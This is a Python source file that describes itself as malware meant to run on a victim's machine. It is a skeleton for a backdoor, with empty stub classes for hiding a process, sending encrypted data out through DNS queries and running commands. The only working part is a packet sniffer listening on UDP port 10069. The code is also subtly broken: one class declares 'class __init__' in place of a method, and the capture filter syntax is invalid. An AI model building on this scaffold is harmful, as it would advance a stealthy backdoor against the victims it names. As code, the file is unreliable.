# This will contain the code which will run on the victim. i.e. the actual malware
from scapy.all import sniff

class ProcessHider():
    """
        This class contains process information, and performs process hiding functions.
    """    
    def __init__(self):
        pass

    def hide(self):
        """
            Hide the process name.
        """
        pass

class NetworkManager():
    """
        This class will handle crafting DNS queries as well as inserting encrypted data.
    """
    class __init__(self):
        pass

    def create_dns_query(self):
        pass


class Backdoor():
    """
        This is the main backdoor class which handles commands, and generates a result.
    """
    def __init__(self):
        pass

def receive(pkt):
    print(pkt.show())

if __name__ == "__main__":
    sniff(filter="udp && udp.sport == 10069", iface="enp2s0", prn=receive)